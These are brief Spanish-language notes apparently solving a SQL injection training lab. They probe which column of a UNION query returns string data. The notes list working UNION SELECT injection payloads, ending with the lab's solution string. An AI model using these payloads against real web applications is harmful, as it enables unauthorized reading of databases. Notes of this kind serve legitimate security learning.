...
Por cada una de las columnas le pasamos un parametro string para ver si la columna es de tipo string
...
Prabando por cada column
' UNION select 'a', NULL, NULL--'
' UNION select NULL, 'a', NULL--
-> 2nd column of type string

Solucion del lab
' UNION select NULL, 'Q9rP2A', NULL--   # 'Q9rP2A', Este era el parametro de prueba del lab
